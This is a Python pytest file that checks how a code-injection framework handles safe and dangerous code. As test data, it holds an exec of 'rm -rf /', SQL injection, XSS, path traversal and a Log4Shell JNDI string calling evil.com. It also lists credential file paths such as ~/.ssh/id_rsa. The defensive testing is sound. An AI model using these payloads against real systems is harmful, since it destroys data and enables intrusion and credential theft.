"""
Basic Security Tests for Epic #127

Simple security validation tests to ensure the injection framework
handles potentially dangerous code safely.
"""

import pytest
from kinda.injection.injection_engine import InjectionEngine, InjectionConfig
from kinda.injection.ast_analyzer import PatternType
from kinda.migration.decorators import enhance


class TestBasicSecurity:
    """Basic security tests for the injection framework"""

    def setup_method(self):
        self.engine = InjectionEngine()

    def test_safe_code_processing(self):
        """Test that safe code is processed correctly"""

        safe_code = '''
def safe_function(x: int) -> int:
    result = x + 42
    print(f"Result: {result}")
    return result
'''

        config = InjectionConfig(
            enabled_patterns={PatternType.KINDA_INT, PatternType.SORTA_PRINT},
            safety_level="safe"
        )

        result = self.engine.inject_source(safe_code, config, "safe_test")
        assert result.success, "Safe code should be processed successfully"

    def test_malicious_code_handling(self):
        """Test handling of potentially malicious code"""

        malicious_code = '''
def malicious_function():
    import os
    exec("os.system('rm -rf /')")
    return 42
'''

        config = InjectionConfig(
            enabled_patterns={PatternType.KINDA_INT},
            safety_level="safe"
        )

        result = self.engine.inject_source(malicious_code, config, "malicious_test")

        # Should either fail or sanitize the dangerous code
        if result.success:
            # If successful, verify dangerous constructs are removed/neutralized
            assert 'exec(' not in result.transformed_code
            assert 'os.system' not in result.transformed_code

    def test_decorator_safety(self):
        """Test that decorators handle potentially unsafe code"""

        @enhance(patterns=['kinda_int'], safety_level='safe')
        def test_function(x: int) -> int:
            # This should be safe
            return x * 2

        # Should execute without issues
        result = test_function(5)
        assert isinstance(result, int)

    def test_input_validation(self):
        """Test input validation for various dangerous inputs"""

        dangerous_inputs = [
            "'; DROP TABLE users; --",
            "<script>alert('xss')</script>",
            "../../etc/passwd",
            "${jndi:ldap://evil.com/a}"
        ]

        for dangerous_input in dangerous_inputs:
            code = f'''
def process_input():
    user_input = "{dangerous_input}"
    return len(user_input)
'''

            config = InjectionConfig(
                enabled_patterns={PatternType.KINDA_INT},
                safety_level="safe"
            )

            result = self.engine.inject_source(code, config, "input_test")

            # Should handle safely - either process or reject
            assert result.success or len(result.errors) > 0

    def test_file_path_security(self):
        """Test security of file path handling"""

        suspicious_paths = [
            "/etc/passwd",
            "../../../secret.txt",
            "~/.ssh/id_rsa",
            "/proc/version"
        ]

        for path in suspicious_paths:
            code = f'''
def file_operation():
    file_path = "{path}"
    # Simulate file access
    return file_path
'''

            config = InjectionConfig(
                enabled_patterns={PatternType.KINDA_INT},
                safety_level="safe"
            )

            result = self.engine.inject_source(code, config, "file_test")

            # Should process safely (not necessarily reject, but handle safely)
            assert result.success or "security" in str(result.errors).lower()

    def test_safety_levels(self):
        """Test different safety levels"""

        borderline_code = '''
def borderline_function():
    import json
    import os
    config_path = os.path.join(".", "config.json")
    return config_path
'''

        # Should work in risky mode
        risky_config = InjectionConfig(
            enabled_patterns={PatternType.KINDA_INT},
            safety_level="risky"
        )

        risky_result = self.engine.inject_source(borderline_code, risky_config, "risky_test")
        # In risky mode, should generally succeed

        # May be more restrictive in safe mode
        safe_config = InjectionConfig(
            enabled_patterns={PatternType.KINDA_INT},
            safety_level="safe"
        )

        safe_result = self.engine.inject_source(borderline_code, safe_config, "safe_test")
        # Could succeed or fail in safe mode - both are acceptable

    def test_injection_isolation(self):
        """Test that injections don't interfere with each other"""

        code1 = '''
def function1():
    return 42
'''

        code2 = '''
def function2():
    return 84
'''

        config = InjectionConfig(
            enabled_patterns={PatternType.KINDA_INT},
            safety_level="safe"
        )

        result1 = self.engine.inject_source(code1, config, "isolation1")
        result2 = self.engine.inject_source(code2, config, "isolation2")

        # Both should succeed
        assert result1.success
        assert result2.success

        # Results should be independent
        # Note: The actual transformed code may not contain function names
        # if no patterns were applied, which is also acceptable
        if result1.applied_patterns:
            assert "function1" in result1.transformed_code or "function1" in code1
        if result2.applied_patterns:
            assert "function2" in result2.transformed_code or "function2" in code2


def test_security_smoke_test():
    """Quick smoke test for security functionality"""
    engine = InjectionEngine()

    # Test safe code
    safe_code = '''
def safe_test():
    x = 42
    print("Safe operation")
    return x
'''

    config = InjectionConfig(
        enabled_patterns={PatternType.KINDA_INT, PatternType.SORTA_PRINT},
        safety_level="safe"
    )

    result = engine.inject_source(safe_code, config, "smoke_test")
    assert result.success, "Safe code should be processed successfully"

    print("✓ Basic security validation smoke test passed")


if __name__ == "__main__":
    test_security_smoke_test()
    print("Epic #127 basic security tests complete!")